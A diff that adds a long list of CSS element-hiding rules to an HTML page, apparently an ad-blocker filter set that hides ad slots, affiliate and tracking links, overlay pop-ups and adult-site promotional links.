+a[href^="https://cams.imagetwist.com/in/?track="] { display: none !important; }
+div[id*="ScriptRoot"] { display: none !important; }
+a[href^="https://xbet-4.com/"] { display: none !important; }
+citrus-ad-wrapper { display: none !important; }
+[href^="https://www.targetingpartner.com/"] { display: none !important; }
+a[href^="https://ad.zanox.com/ppc/"] > img { display: none !important; }
+a[href^="https://engine.phn.doublepimp.com/"] { display: none !important; }
+div[id^="ads300_100-widget-"] { display: none !important; }
+[data-desktop-ad-id] { display: none !important; }
+[href^="https://pl.allsports4free.club/"] { display: none !important; }
+a[href^="http://adtrack"] { display: none !important; }
+div[data-alias="300x250 Ad 1"] { display: none !important; }
+[href="https://video-finder.net/"] { display: none !important; }
+a-ad { display: none !important; }
+a[href^="https://ndt5.net/"] { display: none !important; }
+a[href^="https://www.mypornstarcams.com/landing/click/"] { display: none !important; }
+[data-m-ad-id] { display: none !important; }
+a[href^="https://www.toprevenuegate.com/"] { display: none !important; }
+a[href^="https://ismlks.com/"] { display: none !important; }
+[href^="https://fireads.online/"] { display: none !important; }
+a[href^="https://fastestvpn.com/lifetime-special-deal?a_aid="] { display: none !important; }
+a[href^="https://get.surfshark.net/aff_c?"][href*="&aff_id="] > img { display: none !important; }
+[href="https://clickaine.com"] { display: none !important; }
+a[href^="https://www.onlineusershielder.com/"] { display: none !important; }
+div[style^="position: fixed; inset: 0px; z-index: 2147483647; background: black; opacity: 0.01"] { display: none !important; }
+[href="https://jdrucker.com/gold"] > img { display: none !important; }
+div[id^="ezoic-pub-ad-"] { display: none !important; }
+a[href^="https://mmwebhandler.aff-online.com/"] { display: none !important; }
+a[href^="https://adultfriendfinder.com/go/"] { display: none !important; }
+a[href^="https://dl-protect.net/"] { display: none !important; }
+a[href^="https://ausoafab.net/"] { display: none !important; }
+[href^="http://clicks.totemcash.com/"] { display: none !important; }
+a[id][href="https://hamrocsit.com"][rel^="noopener noreferrer"] { display: none !important; }
+a[href^="https://financeads.net/tc.php?"] { display: none !important; }
+amp-ad { display: none !important; }
+a[href^="https://go.xlirdr.com"] { display: none !important; }
+img[src^="https://images.purevpnaffiliates.com"] { display: none !important; }
+a[href^="https://go.trackitalltheway.com/"] { display: none !important; }
+[data-dynamic-ads] { display: none !important; }
+a[href^="https://mediaserver.gvcaffiliates.com/renderBanner.do?"] { display: none !important; }
+ad-triple-box { display: none !important; }
+[href^="https://adult.xyz/"] { display: none !important; }
+ark-top-ad { display: none !important; }
+a[href^=" https://www.friendlyduck.com/AF_"] { display: none !important; }
+a[href^="https://bongacams10.com/track?"] { display: none !important; }
+a[href^="http://www.friendlyduck.com/AF_"] { display: none !important; }
+a[href^="//sTaRTgamING.net/tienda/"] { display: none !important; }
+[href^="https://wct.link/"] { display: none !important; }
+article.ad { display: none !important; }
+div[id^="ad-div-"] { display: none !important; }
+a[href^="http://naggingirresponsible.com/"] { display: none !important; }
+a[href^="https://offhandpump.com/"] { display: none !important; }
+[href^="https://track.wg-aff.com/click"] { display: none !important; }
+a[href^="https://gamingadlt.com/?offer="] { display: none !important; }
+[class^="s2nPlayer"] { display: none !important; }
+a[href^="http://troopsassistedstupidity.com/"] { display: none !important; }
+div[style="position: fixed; display: block; width: 100%; height: 100%; inset: 0px; background-color: rgba(0, 0, 0, 0); z-index: 300000;"] { display: none !important; }
+div[data-ad-targeting] { display: none !important; }
+[href^="https://zstacklife.com/"] img { display: none !important; }
+a[href^="https://track.afcpatrk.com/"] { display: none !important; }
+a[href^="https://www.adxsrve.com/"] { display: none !important; }
+[href^="https://go.rdrjmp.com/"] { display: none !important; }
+a[href^="https://slkmis.com/"] { display: none !important; }
+a[href^="https://click.dtiserv2.com/"] { display: none !important; }
+a[href^="https://kiksajex.com/"] { display: none !important; }
+dfp-ad { display: none !important; }
+a[href^="https://go.xxxjmp.com"] { display: none !important; }
+a[href^="https://a-ads.com/"] { display: none !important; }
+a[href^="http://www.adultdvdempire.com/?partner_id="][href*="&utm_"] { display: none !important; }
+a[href^="https://itubego.com/video-downloader/?affid="] { display: none !important; }
+a[href^="https://lnkxt.bannerator.com/"] { display: none !important; }
+[href^="https://affect3dnetwork.com/track/"] { display: none !important; }
+a[href^="https://chaturbate.com/in/?track="] { display: none !important; }
+[href^="https://track.aftrk1.com/"] { display: none !important; }
+a[href^="https://go.xxxijmp.com"] { display: none !important; }
+a[href^="https://a.bestcontentoperation.top/"] { display: none !important; }
+[href^="https://join3.bannedsextapes.com"] { display: none !important; }
+div[id^="_vdo_ads_player_ai_"] { display: none !important; }
+[href^="https://popcash.net/"] { display: none !important; }
+[href^="https://freecourseweb.com/"] > .sitefriend { display: none !important; }
+a[href^="https://leg.xyz/?track="] { display: none !important; }
+[data-role="tile-ads-module"] { display: none !important; }
+a[href^="https://clickadilla.com/"] { display: none !important; }
+div[id^="dfp-ad-"] { display: none !important; }
+guj-ad { display: none !important; }
+a[href^="https://t.hrtye.com/"] { display: none !important; }
+a[href^="http://avthelkp.net/"] { display: none !important; }
+a[href^="http://www.h4trck.com/"] { display: none !important; }
+a[href^="https://play1ad.shop/"] { display: none !important; }
+ad-slot { display: none !important; }
+a[href^="https://t.aslnk.link/"] { display: none !important; }
+[href*="postlnk.com"] { display: none !important; }
+div[id^="adngin-"] { display: none !important; }
+a[href^="https://go.hpyjmp.com"] { display: none !important; }
+a[data-oburl^="https://paid.outbrain.com/network/redir?"] { display: none !important; }
+[href^="https://www.hostg.xyz/"] > img { display: none !important; }
+div[data-dfp-id] { display: none !important; }
+a[href^="https://a2.adform.net/"] { display: none !important; }
+a[href^="https://track.1234sd123.com/"] { display: none !important; }
+div[id^="google_dfp_"] { display: none !important; }
+[href^="https://dl-protect.net/get-premium-url"] { display: none !important; }
+a[href^="https://cam4com.go2cloud.org/"] { display: none !important; }
+a[href^="https://juicyads.in/"] { display: none !important; }
+a[href^="https://clixtrac.com/"] { display: none !important; }
+a[href^="https://tm-offers.gamingadult.com/"] { display: none !important; }
+a[href^="https://zirdough.net/"] { display: none !important; }
+a[href^="http://https://www.get-express-vpn.com/offer/"] { display: none !important; }
+a[href^="https://torguard.net/aff.php"] > img { display: none !important; }
+a[data-widget-outbrain-redirect^="http://paid.outbrain.com/network/redir?"] { display: none !important; }
+[href^="//ad.jetx.info/"] { display: none !important; }
+a[href^="https://ads.betfair.com/redirect.aspx?"] { display: none !important; }
+a[href^="https://track.totalav.com/"] { display: none !important; }
+[href^="https://join.playboyplus.com/track/"] { display: none !important; }
+a[href^="https://a.adtng.com/"] { display: none !important; }
+a[href^="https://join.sexworld3d.com/track/"] { display: none !important; }
+div[style*="box-shadow: rgb(136, 136, 136) 0px 0px 12px; color: "] { display: none !important; }
+ad-slot { display: none !important; }
+[href^="https://buycheaphost.net/"] { display: none !important; }
+a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source { display: none !important; }
+div[id^="ad_position_"] { display: none !important; }
+a[href^="http://tc.tradetracker.net/"] > img { display: none !important; }
+div[id^="gpt_ad_"] { display: none !important; }
+a[href^="http://www.mrskin.com/tour"] { display: none !important; }
+a[href^="https://go.strpjmp.com/"] { display: none !important; }
+[style="position:absolute;top:0;left:0;width: 100%;height: 100%;z-index:2147483647"] { display: none !important; }
+a[href^="https://claring-loccelkin.com/"] { display: none !important; }
+a[href*="/go.php?a_aid="] { display: none !important; }
+a[href^="https://trk.softonixs.xyz/"] { display: none !important; }
+bottomadblock { display: none !important; }
+a[href^="http://bongacams.com/track?"] { display: none !important; }
+[href^="https://go.astutelinks.com/"] { display: none !important; }
+a[href^="https://banners.livepartners.com/"] { display: none !important; }
+a[href^="https://www.liquidfire.mobi/"] { display: none !important; }
+[data-testid="ad_testID"] { display: none !important; }
+app-advertisement { display: none !important; }
+[href^="https://www.profitablegatecpm.com/"] { display: none !important; }
+a[href^="https://get-link.xyz/"] { display: none !important; }
+a[href^="http://dragfault.com/"] { display: none !important; }
+[style="top: 0px; left: 0px; width: 940px; height: 600px; position: absolute; z-index: 2147483647;"] { display: none !important; }
+a[href^="https://www.purevpn.com/"][href*="&utm_source=aff-"] { display: none !important; }
+div[data-contentexchange-widget] { display: none !important; }
+[name^="google_ads_iframe"] { display: none !important; }
+a[href^="https://s.optzsrv.com/"] { display: none !important; }
+[data-ad-module] { display: none !important; }
+a[id][href="https://toolkitspro.com"][rel^="noopener noreferrer"] { display: none !important; }
+a[href^="https://intenseaffiliates.com/redirect/"] { display: none !important; }
+a[href^="http://www.adultempire.com/unlimited/promo?"][href*="&partner_id="] { display: none !important; }
+topadblock { display: none !important; }
+a[href*=".foxqck.com/"] { display: none !important; }
+[href^="https://mylead.global/stl/"] > img { display: none !important; }
+a[href^="https://go.skinstrip.net"][href*="?campaignId="] { display: none !important; }
+div[id^="div-gpt-"]:not([style^="width: 1px; height: 1px; position: absolute; left: -10000px; top: -"]) { display: none !important; }
+a[href^="https://www.friendlyduck.com/AF_"] { display: none !important; }
+div[id^="ads300_250-widget-"] { display: none !important; }
+a[href^="https://safesurfingtoday.com/"][href*="?skip="] { display: none !important; }
+[id^="ad_sky"] { display: none !important; }
+[href^="//look.utndln.com/offer"] { display: none !important; }
+div[id^="div-ads-"] { display: none !important; }
+a[href^="https://camfapr.com/landing/click/"] { display: none !important; }
+a[href^="http://li.blogtrottr.com/click?"] { display: none !important; }
+a[href^="https://disobediencecalculatormaiden.com/"] { display: none !important; }
+[href^="https://wap4dollar.com/ad/nonadult/serve.php"] { display: none !important; }
+a[href^="https://trk.nfl-online-streams.club/"] { display: none !important; }
+a[href^="https://a.medfoodhome.com/"] { display: none !important; }
+[href="//xxxrevpushclcdu.com/app.webp"] { display: none !important; }
+[href^="https://www.cloudways.com/en/?id"] { display: none !important; }
+a[href^="https://golinks.work/"] { display: none !important; }
+a[href^="http://bc.vc/?r="] { display: none !important; }
+a[href^="https://black77854.com/"] { display: none !important; }
+[data-id^="div-gpt-ad"] { display: none !important; }
+a[href^="https://join.dreamsexworld.com/"] { display: none !important; }
+a[href^="https://t.ajrkm1.com/"] { display: none !important; }
+a[href^="https://activate-game.com/"] { display: none !important; }
+div#spot-holder.spot-holder[style="display: block;"] { display: none !important; }
+a[href^="https://www.nudeidols.com/cams/"] { display: none !important; }
+[href^="https://exi8ef83z9.com/"] { display: none !important; }
+[href^="//clk.afftracks.online/"] { display: none !important; }
+[data-ad-width] { display: none !important; }
+ </style>
+</html>
